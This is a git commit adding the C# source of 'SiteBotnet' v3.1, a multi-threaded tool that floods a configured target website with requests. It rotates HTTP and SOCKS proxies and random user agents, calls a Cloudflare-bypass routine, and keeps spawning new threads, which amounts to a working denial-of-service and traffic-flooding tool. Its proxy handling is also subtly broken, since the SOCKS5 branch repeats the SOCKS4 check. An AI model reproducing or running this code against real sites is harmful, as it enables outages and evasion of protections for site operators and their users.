2558141b0458ea05c9e6c65124c41f499a878e71
ShiningLea <49339966+AnErrupTion@users.noreply.github.com>
2019-10-05 12:29:30 +0200

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using Leaf.xNet;
+using System.IO;
+using Leaf.xNet.Services.Cloudflare;
+using System.Net.NetworkInformation;
+using System.Threading;
+using ConfigParser;
+
+namespace SiteBotnet3
+{
+    class Program
+    {
+        private static string AppName = "SiteBotnet";
+        private static string AppVersion = "3.1";
+
+        static void Main(string[] args)
+        {
+            Parser p = new Parser("config.txt");
+            if (!File.Exists("proxies.txt")) File.WriteAllText("proxies.txt", "");
+
+            string Target = p.ReadConfig("Target").ToString().Split('=')[1].Replace(" ", "");
+            string Keyword = p.ReadConfig("Keyword").ToString().Split('=')[1].Replace(" ", "");
+            int Threads = Convert.ToInt32(p.ReadConfig("Threads").ToString().Split('=')[1].Replace(" ", ""));
+            string ProxyType = p.ReadConfig("ProxyType").ToString().Split('=')[1].Replace(" ", "");
+            List<string> ProxyList = new List<string>(File.ReadAllLines("proxies.txt"));
+
+            Console.Title = AppName + " v" + AppVersion;
+
+            for (int i = 0; i < Threads; i++)
+            {
+                Requests req = new Requests("[ThreadHttp-" + i + "]");
+                req.SetTarget(Target);
+                req.SetKeyword(Keyword);
+                req.SetThreads(Threads);
+                req.SetProxyType(ProxyType);
+                req.SetProxyList(ProxyList);
+                req.Start();
+            }
+
+            return;
+        }
+    }
+}
---
+++ Requests.cs
@@ -0,0 +1,151 @@
+﻿using System;
+using System.Collections.Generic;
+using Leaf.xNet;
+using System.IO;
+using Leaf.xNet.Services.Cloudflare;
+using System.Net.NetworkInformation;
+using System.Threading;
+
+namespace SiteBotnet3
+{
+    class Requests
+    {
+        private string ProxyType;
+        private List<string> ProxyList;
+
+        private string Keyword;
+        private string Target;
+        private int Threads;
+
+        private int Hits;
+
+        private Thread Thread;
+        private string ThreadName;
+
+        public Requests(string Name) { ThreadName = Name; }
+
+        public void SetTarget(string Target)
+        {
+            this.Target = Target;
+        }
+
+        public void SetKeyword(string Keyword)
+        {
+            this.Keyword = Keyword;
+        }
+
+        public void SetThreads(int Threads)
+        {
+            this.Threads = Threads;
+        }
+
+        public void SetProxyType(string ProxyType)
+        {
+            this.ProxyType = ProxyType;
+        }
+
+        public void SetProxyList(List<string> ProxyList)
+        {
+            if (!ProxyType.Equals("NONE")) this.ProxyList = ProxyList;
+        }
+
+        public void Start()
+        {
+            Console.WriteLine(ThreadName + " IS STARTING...");
+            Thread = new Thread(BotnetWebsite) { Name = ThreadName };
+            Thread.Start();
+        }
+
+        private void BotnetWebsite()
+        {
+            request: try
+            {
+                using (HttpRequest req = new HttpRequest())
+                {
+                    req.UserAgent = Http.RandomUserAgent();
+                    req.IgnoreProtocolErrors = true;
+                    req.Cookies = new CookieStorage();
+                    req.KeepAlive = true;
+
+                    if (ProxyType == "HTTP")
+                    {
+                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
+                        req.Proxy = HttpProxyClient.Parse(proxy);
+                        Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
+                    }
+                    else if (ProxyType == "SOCKS4")
+                    {
+                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
+                        req.Proxy = Socks4ProxyClient.Parse(proxy);
+                        Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
+                    }
+                    else if (ProxyType == "SOCKS4")
+                    {
+                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
+                        req.Proxy = Socks5ProxyClient.Parse(proxy);
+                        Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
+                    }
+                    else if (ProxyType == "NONE")
+                    {
+                        req.Proxy = null;
+                        req.KeepAlive = true;
+                    }
+                    Thread.Sleep(100);
+
+                    HttpResponse respo = req.Post(Target);
+                    if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(Target);
+
+                    using (HttpRequest req1 = new HttpRequest())
+                    {
+                        req1.UserAgent = Http.RandomUserAgent();
+                        req1.IgnoreProtocolErrors = true;
+                        req1.Cookies = new CookieStorage();
+
+                        if (ProxyType == "HTTP")
+                        {
+                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
+                            req1.Proxy = new HttpProxyClient(proxy);
+                            Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
+                        }
+                        else if (ProxyType == "SOCKS4")
+                        {
+                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
+                            req1.Proxy = new Socks4ProxyClient(proxy);
+                            Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
+                        }
+                        else if (ProxyType == "SOCKS4")
+                        {
+                            string proxy = ProxyList[new Random().Next(ProxyList.Count)];
+                            req1.Proxy = new Socks5ProxyClient(proxy);
+                            Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
+                        }
+                        else if (ProxyType == "NONE")
+                        {
+                            req1.Proxy = null;
+                            req1.KeepAlive = true;
+                        }
+                        Thread.Sleep(100);
+
+                        HttpResponse respo1 = req1.Get(Target);
+                        if (respo1.IsCloudflared()) respo1 = req1.GetThroughCloudflare(Target);
+
+                        if (respo1.ToString().Contains(Keyword))
+                        {
+                            Hits += 1;
+                            Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! Keyword : " + Keyword + " | Target : " + Target + " | Threads : " + Threads);
+
+                            Uri uri = new Uri(Target);
+                            Ping pi = new Ping();
+                            long roundtripTime = pi.Send(uri.Host).RoundtripTime;
+                            Console.WriteLine(ThreadName + " Pinged website : " + roundtripTime + "ms");
+                        }
+                        else Console.WriteLine(ThreadName + " FAILED! Keyword : " + Keyword + " | Target : " + Target + " | Threads : " + Threads);
+
+                        Start();
+                    }
+                }
+            }
+            catch { goto request; }
+        }
+    }
+}
